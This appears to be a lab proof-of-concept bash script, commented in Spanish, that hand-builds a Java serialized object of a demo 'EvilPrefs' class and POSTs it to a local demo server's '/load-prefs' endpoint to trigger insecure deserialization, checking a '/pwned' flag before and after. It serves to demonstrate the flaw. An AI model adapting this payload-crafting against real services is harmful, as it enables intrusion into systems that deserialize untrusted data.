#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"
PORT="${PORT:-8080}"; BASE="http://127.0.0.1:$PORT"
echo "Estado inicial: $(curl -s "$BASE/pwned")"
# Flujo Java serializado de una instancia de demo.App$EvilPrefs (SUID 1L, sin campos),
# armado a mano: equivale a lo que produciria new ObjectOutputStream().writeObject(evil)
python3 - <<'PY' > payload.bin
import struct, sys
name = b"demo.App$EvilPrefs"
s = b"\xac\xed\x00\x05" + b"\x73\x72" + struct.pack(">H", len(name)) + name
s += struct.pack(">q", 1) + b"\x02" + struct.pack(">H", 0) + b"\x78\x70"
sys.stdout.buffer.write(s)
PY
echo "Enviando payload serializado malicioso (application/octet-stream)..."
echo "Respuesta: $(curl -s -X POST "$BASE/load-prefs" -H 'Content-Type: application/octet-stream' --data-binary @payload.bin)"
echo "Despues del ataque: $(curl -s "$BASE/pwned")"
rm -f payload.bin
